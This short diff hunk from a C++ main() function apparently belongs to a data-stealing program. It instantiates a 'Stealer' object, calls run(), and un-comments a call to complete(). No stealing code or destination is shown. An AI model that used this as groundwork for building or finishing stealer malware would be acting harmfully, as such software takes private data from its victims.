@@ -38,7 +38,7 @@ int main() {
 
     Stealer stealer;
     stealer.run();
-//    stealer.complete();
+    stealer.complete();
 
 
     return 0;
